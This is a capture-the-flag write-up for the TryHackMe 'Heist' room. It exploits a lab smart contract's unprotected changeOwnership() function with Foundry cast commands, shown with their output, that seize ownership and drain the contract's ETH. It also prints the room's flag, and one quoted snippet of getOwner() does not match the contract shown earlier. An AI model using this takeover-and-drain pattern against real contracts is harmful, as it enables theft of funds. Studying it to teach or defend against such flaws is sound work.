# Hackfinity: Heist

* [Heist](https://tryhackme.com/room/hfb1heist)

## 1. Setup

1. Run following Commands to Get Information
```sh
RPC_URL=http://$TARGET:8545
API_URL=http://$TARGET
PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
echo "Check if is solved: $is_solved"
```

2. Create Directory and save everything into the files
```sh
mkdir -p Desktop/heist
cd Desktop/heist
echo $PRIVATE_KEY > private.txt
echo $CONTRACT_ADDRESS > contract.txt
echo $PLAYER_ADDRESS > player.txt
```

3. Browse URL (`http://$TARGET`) and Analyze the Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    address private owner;
    address private initOwner;
    constructor() payable {
        owner = msg.sender;
        initOwner = msg.sender;
    }
    
    function changeOwnership() external {
            owner = msg.sender;
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Not owner!");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getOwnerBalance() external view returns (uint256) {
        return address(initOwner).balance;
    }

    function isSolved() external view returns (bool) {
        return (address(this).balance == 0);
    }

    function getAddress() external view returns (address) {
        return msg.sender;
    }

     function getOwner() external view returns (address) {
        return owner;
    }
}
```

## 2. Analyzing Code

1. `isSolved()` returns **True** if we **DRAIN** all **ETHs** in the **Wallet of Contract**
```solidity
    function isSolved() external view returns (bool) {
        return (address(this).balance == 0);
    }
```

1. `withdraw()` function transfers **ALL Money** in **Wallet of Contract** to **OWNER**, when owner request (`msg.sender == owner`)
```solidity
    function withdraw() external {
        require(msg.sender == owner, "Not owner!");
        payable(owner).transfer(address(this).balance);
    }
```

2. `getBalance()` allows everybody to check the **Balance**
```solidity
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
```

3. `getOwnerBalance()` returns the **Balance** of **Owner**
```solidity
    function getOwnerBalance() external view returns (uint256) {
        return address(initOwner).balance;
    }
```

4. `getOwner()` returns the **Address** of **Owner**
```solidity
    function getOwner() external view returns (address) {
        return address(initOwner).balance;
    }
```

5. `changeOwnership()` **changes** the **Owner**
```solidity
    function changeOwnership() external {
            owner = msg.sender;
    }
```

## 3. Exploitation

1. Get Owner address and it seems, it is different than yours.
```sh
cast call $CONTRACT_ADDRESS "getOwner()(address)" --rpc-url ${RPC_URL}
# 0x1A32A5377dF619580E3bEde8bff6C872797fE8aC
echo $PLAYER_ADDRESS
# 0x0BEE245736E6ca5D52F0b471f4ED63cdB5c0efE3
```

2. get **Balance** of **Owner** and **your own Wallet**
```sh
cast call $CONTRACT_ADDRESS "getOwnerBalance()(uint256)" --rpc-url ${RPC_URL}
# 0
cast call $CONTRACT_ADDRESS "getBalance()(uint256)" --rpc-url ${RPC_URL}
# 200000000000000000000 [2e20]
```

3. We may be able to **change the Owner** by sending a request to `changeOwnership()`
```sh
cast send $CONTRACT_ADDRESS "changeOwnership()" --rpc-url ${RPC_URL} --private-key $PRIVATE_KEY --legacy
# blockHash               0x97879083e5d8d6581f41c08353ef22288db9a298cc79493f2c2668314a7f875c
# blockNumber             3
# contractAddress         
# cumulativeGasUsed       27075
# effectiveGasPrice       1000000000
# from                    0x0BEE245736E6ca5D52F0b471f4ED63cdB5c0efE3
# gasUsed                 27075
# logs                    []
# logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
# root                    
# status                  1 (success)
# transactionHash         0xf0e72f6af404f7d240615064d423e67649bbe4ffa4cfecbdeb999c8d49a8aafe
# transactionIndex        0
# type                    0
# blobGasPrice            
# blobGasUsed             
# to                      0xf22cB0Ca047e88AC996c17683Cee290518093574
```

4. Let's check it
```sh
cast call $CONTRACT_ADDRESS "getOwner()(address)" --rpc-url ${RPC_URL}
# 0x0BEE245736E6ca5D52F0b471f4ED63cdB5c0efE3
```

5. Now. we can ask the Smart Contract to send everything to owner(our Address).
```sh
cast send $CONTRACT_ADDRESS "withdraw()" --rpc-url ${RPC_URL} --private-key $PRIVATE_KEY --legacy
# blockHash               0x06e5a7b9cf54e33ebf8fee1e38efc12c839553999ed1be8a9c09b42be0c7d61a
# blockNumber             4
# contractAddress         
# cumulativeGasUsed       30414
# effectiveGasPrice       1000000000
# from                    0x0BEE245736E6ca5D52F0b471f4ED63cdB5c0efE3
# gasUsed                 30414
# logs                    []
# logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
# root                    
# status                  1 (success)
# transactionHash         0x8f9e887bb5fd471f2630c76574e14f6010ac8222672aa8d371219fc571188214
# transactionIndex        0
# type                    0
# blobGasPrice            
# blobGasUsed             
# to                      0xf22cB0Ca047e88AC996c17683Cee290518093574
```

6. Let's check `isSolved()` function.
```sh
cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}
# true
```

7. Get Flag in browser (`http://$TARGET`)
```
THM{web3_h31st_d0ne}
```

## References

* [Cast Application](https://getfoundry.sh/cast/overview)
